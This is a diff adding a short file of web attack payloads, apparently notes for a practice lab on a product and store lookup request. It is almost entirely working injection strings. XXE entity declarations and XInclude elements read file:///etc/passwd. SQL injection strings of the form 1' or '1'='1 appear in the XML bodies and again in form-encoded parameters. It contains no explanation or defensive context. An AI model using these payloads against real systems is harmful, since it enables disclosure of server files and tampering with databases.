@@ -1,0 +1,46 @@
+Content-Type: application/xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</root>
+
+
+
+----------------------------------
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <productId>
+    <xi:include parse="text" href="file:///etc/passwd"/>
+  </productId>
+  <storeId>1</storeId>
+</root>
+
+
+
+
+-----------------------------------
+<root>
+  <productId>1' or '1'='1</productId>
+  <storeId>1</storeId>
+</root>
+
+
+
+----------------------------------
+Keep application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded
+productId=1&storeId=1
+
+-------
+productId=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>&storeId=1
+
+
+
+-------------------------------------
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+            <xi:include parse="text" href="file:///etc/passwd"/>
+          </foo>&storeId=1
+------------------------------------
+productId=1' or '1'='1&storeId=1
+
